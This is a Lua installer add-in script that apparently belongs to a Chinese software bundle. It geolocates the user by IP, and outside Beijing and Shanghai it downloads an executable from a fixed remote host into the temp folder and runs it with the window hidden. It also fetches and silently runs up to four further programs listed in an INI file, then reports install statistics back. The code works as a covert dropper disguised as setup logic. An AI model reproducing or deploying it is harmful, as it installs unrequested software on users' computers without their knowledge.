local FunctionObj = XLGetGlobal("Setup.FunctionHelper")
local apiUtil = XLGetObject("Setup.Util")
local apiAsyn = XLGetObject("GS.AsynUtil")
local strIPUrl = "http://ip.dnsexit.com/index.php"
local strIPToCity = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip="
local gtabBlackCity = {
			["exclude"] = {
					["p"] = {"北京","上海"},
				}, 
		}

local strJSExeUrl = "http://dl.52jsqx.com/setup/1.0/dclhostSetup_0001.exe"

function GTV(obj)
	return "[" .. type(obj) .. "`" .. tostring(obj) .. "]"
end

function Log(str)
	apiUtil:Log(tostring(str))
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end
function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

local JsonFun = XLGetGlobal("GS.Json")

function CheckIsInZone(strProvince,strCity)
	local tabProvinceInclude = {}
	local tabProvinceExclude = {}
	local tabCityInclude = {}
	local tabCityExclude = {}
	tabInfo = gtabBlackCity
	if type(tabInfo) ~= "table" then
		return true
	end
	local function GetTipZoneInfo()
		--先解析包含的部分
		tabProvinceInclude = FetchValueByPath(tabInfo, {"include", "p"})
		if type(tabProvinceInclude) ~= "table" then
			tabProvinceInclude = {}
		end
		tabCityInclude = FetchValueByPath(tabInfo, {"include", "c"})
		if type(tabCityInclude) ~= "table" then
			tabCityInclude = {}
		end
		--再解析不包含的部分
		tabProvinceExclude = FetchValueByPath(tabInfo, {"exclude", "p"})
		if type(tabProvinceExclude) ~= "table" then
			tabProvinceExclude = {}
		end
		tabCityExclude = FetchValueByPath(tabInfo, {"exclude", "c"})
		if type(tabCityExclude) ~= "table" then
			tabCityExclude = {}
		end
	end
	local bRet = false
	GetTipZoneInfo()
	local bInProvince = false
	local bInCity = false
	local bOutProvince = true
	local bOutCity = true
	if #tabProvinceInclude > 0 or #tabCityInclude>0 then
		for i = 1, #tabProvinceInclude do
			if string.find(strProvince, tabProvinceInclude[i], 1, true) ~= nil then
				bInProvince = true
				break
			end
		end
		if not bInProvince then
			for i = 1, #tabCityInclude do
				if string.find(strCity, tabCityInclude[i], 1, true) ~= nil then
					bInCity = true
					break
				end
			end
		end
	else -- 不包含include 默认为true
		bInProvince = true
		bInCity = true
	end	
	if #tabProvinceExclude > 0 or #tabCityExclude>0 then
		for i = 1, #tabProvinceExclude do
			if string.find(strProvince, tabProvinceExclude[i], 1, true) ~= nil then
				bOutProvince = false
				break
			end
		end
		if bOutProvince then
			for i = 1, #tabCityExclude do
				if string.find(strCity, tabCityExclude[i], 1, true) ~= nil then
					bOutCity = false
					break
				end
			end
		end
	else -- 不包含exclude 默认为true
		bOutProvince = true
		bOutCity = true
	end	
	if (bInProvince or bInCity) and (bOutProvince and bOutCity) then
		bRet = true
	else
		bRet = false
	end
	return bRet
end

function GetCityInfo(fnSuccess,fnFail)
	FunctionObj.IncreaseExecuteFlowNum("Enter GetCityInfo")
	apiAsyn:AjaxGetHttpContent(strIPUrl, function(iRet, strContent, respHeaders)
		Log("[GetCityInfo] strIPUrl = " .. GTV(strIPUrl) .. ", iRet = " .. GTV(iRet))
		if iRet == 0 then
			local strIP =  string.match(strContent,"(%d+.%d+.%d+.%d+)")
			if IsRealString(strIP) then
				local strQueryIPToCityUrl = strIPToCity .. tostring(strIP)
				apiAsyn:AjaxGetHttpContent(strQueryIPToCityUrl, function(iRet, strContent, respHeaders)
					Log("[GetCityInfo] strQueryIPToCityUrl = " .. GTV(strQueryIPToCityUrl) .. ", iRet = " .. GTV(iRet))
					if iRet == 0 and IsRealString(strContent) then
						local tabCityInfo = JsonFun:decode(strContent)
						if type(tabCityInfo) == "table" then
							local strCity = tabCityInfo["city"]
							local strProvince = tabCityInfo["province"]
							Log("[GetCityInfo] strCity = " .. GTV(strCity) .. ", strProvince = " .. GTV(strProvince))
							if IsRealString(strCity) and IsRealString(strProvince) then
								fnSuccess(strProvince, strCity)
							else
								Log("[GetCityInfo] Get city name failed.")
								fnFail()
							end
						else
							Log("[GetCityInfo] Parse IP to city failed.")
							fnFail()
						end	
					else
						Log("[GetCityInfo] Get IP to city failed.")
						fnFail()
					end
				end)	
			else
				Log("[GetCityInfo] Parse IP failed.")
				fnFail()
			end
		else
			Log("[GetCityInfo] Get IP failed.")
			fnFail()
		end
	end)
end	

function Fail()
	Log("[GetCityInfo] failed.")
	local tStatInfo = {}
	tStatInfo.strEC = "settuplua"
	tStatInfo.strEA = "getinfofail"
	tStatInfo.strEV = 1
	tStatInfo.Exit = true
	FunctionObj.TipConvStatistic(tStatInfo)
	FunctionObj.DecreaseExecuteFlowNum("Exit GetCityInfo")
end

function Sunccess(strProvince,strCity)
	if CheckIsInZone(strProvince,strCity) then
		local strStamp = FunctionObj.GetTimeStamp()
		local strJSExeUrlWithStmp = strJSExeUrl..strStamp
		local nTime = 15*60*1000
		local strJsExeSavePath = apiUtil:GetSystemTempPath()
		local strSaveName = FunctionObj.GetFileSaveNameFromUrl(strJSExeUrl)
		strJsExeSavePath = apiUtil:PathCombine(strJsExeSavePath,strSaveName) 
		FunctionObj.NewAsynGetHttpFile(strJSExeUrlWithStmp, strJsExeSavePath, false
		, function(bRet, strRealPath)
			Log("[Sunccess] bRet:"..tostring(bRet)
					.." strRealPath:"..tostring(strRealPath))
					
			if 0 == bRet then
				apiUtil:ShellExecute(0, "open", strRealPath, "", 0, "SW_HIDE")
				local tStatInfo = {}
				tStatInfo.strEC = "dclsettuplua"
				tStatInfo.strEA = "hostinstall"
				tStatInfo.strEV = 1
				tStatInfo.Exit = true
				FunctionObj.TipConvStatistic(tStatInfo)
			else
				Log("[Sunccess] down exe failed")
				local tStatInfo = {}
				tStatInfo.strEC = "dclsettuplua"
				tStatInfo.strEA = "downhostfail"
				tStatInfo.strEV = 1
				tStatInfo.Exit = true
				FunctionObj.TipConvStatistic(tStatInfo)
			end	
		end, nTime)
	else
		Log("[Sunccess] in black city")
		local tStatInfo = {}
		tStatInfo.strEC = "dclsettuplua"
		tStatInfo.strEA = "condfalse"
		tStatInfo.strEV = 1
		tStatInfo.Exit = true
		FunctionObj.TipConvStatistic(tStatInfo)
	end
	FunctionObj.DecreaseExecuteFlowNum("Exit GetCityInfo")
end

function InstallBindSoftWare(strBindConfigPath)
	FunctionObj.IncreaseExecuteFlowNum("Enter InstallBindSoftWare")
	Log("[InstallBindSoftWare] strBindConfigPath = " .. GTV(strBindConfigPath))
	for iBindIndex = 1,4 do
		local strInstall, bInstall = apiUtil:ReadINI(strBindConfigPath, "bindinfo" .. tostring(iBindIndex), "install")
		Log("[InstallBindSoftWare] strInstall = " .. GTV(strInstall) .. ", bInstall = " .. GTV(bInstall))
		if bInstall and strInstall == "1" then
			local strUrl, bUrl = apiUtil:ReadINI(strBindConfigPath, "bindinfo" .. tostring(iBindIndex), "url")
			Log("[InstallBindSoftWare] strUrl = " .. GTV(strUrl) .. ", bUrl = " .. GTV(bUrl))
			if bUrl and IsRealString(strUrl) then
				local strStamp = FunctionObj.GetTimeStamp()
				local strExeUrlWithStmp = strUrl..strStamp
				local nTime = 15*60*1000
				local strExeSavePath = apiUtil:GetSystemTempPath()
				local strSaveName = FunctionObj.GetFileSaveNameFromUrl(strUrl)
				if string.find(strSaveName,"%.exe$") == nil then
					strSaveName = "bindinfo" .. tostring(iBindIndex) .. ".exe"
				end
				strExeSavePath = apiUtil:PathCombine(strExeSavePath,strSaveName) 
				
				FunctionObj.NewAsynGetHttpFile(strExeUrlWithStmp, strExeSavePath, false
					, function(bRet, strRealPath)
						Log("[InstallBindSoftWare] bRet:"..tostring(bRet)
								.." strRealPath:"..tostring(strRealPath))
								
						if 0 == bRet then
							apiUtil:ShellExecute(0, "open", strRealPath, "", 0, "SW_HIDE")
							local tStatInfo = {}
							tStatInfo.strEC = "dclsettuplua"
							tStatInfo.strEA = "bindinstall"
							tStatInfo.strEL = "sunccess_" .. tostring(iBindIndex)
							tStatInfo.strEV = 1
							tStatInfo.Exit = true
							FunctionObj.TipConvStatistic(tStatInfo)
						else
							Log("[Sunccess] down exe failed")
							local tStatInfo = {}
							tStatInfo.strEC = "dclsettuplua"
							tStatInfo.strEA = "bindinstall"
							tStatInfo.strEL = "fail_" .. tostring(iBindIndex)
							tStatInfo.strEV = 1
							tStatInfo.Exit = true
							FunctionObj.TipConvStatistic(tStatInfo)
						end	
						
					end, nTime)
			end
		end	
	end
	FunctionObj.DecreaseExecuteFlowNum("Exit InstallBindSoftWare")
end

function Run(strParam)
	FunctionObj.IncreaseExecuteFlowNum("Enter dclsetupaddin")
	if type(JsonFun) == "table" then
		GetCityInfo(Sunccess,Fail)
	end
	if IsRealString(strParam) and apiUtil:QueryFileExists(strParam) then
		InstallBindSoftWare(strParam)
	end
	FunctionObj.DecreaseExecuteFlowNum("Exit dclsetupaddin")
end
